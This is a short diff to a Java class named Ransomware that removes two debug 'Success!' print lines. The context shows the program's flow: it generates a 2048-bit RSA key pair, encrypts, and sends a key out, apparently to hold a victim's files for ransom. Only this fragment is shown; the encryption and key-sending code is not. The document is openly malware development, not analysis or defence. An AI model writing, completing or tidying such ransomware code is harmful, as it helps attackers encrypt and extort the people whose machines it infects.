@@ -30,7 +30,6 @@ public class Ransomware {
 	 * Kicks off the ransomware
 	 */
 	public void begin() {
-		System.out.println("Success!");
 		generateKeys();
 		encrypt();
 		sendKey();
@@ -50,7 +49,6 @@ public class Ransomware {
 	 */
 	private void generateKeys() {
 		try {
-			System.out.println("Success!");
 			setKeyPairGen(KeyPairGenerator.getInstance("RSA"));
 			keyPairGen.initialize(2048);
 			setPair(keyPairGen.generateKeyPair());
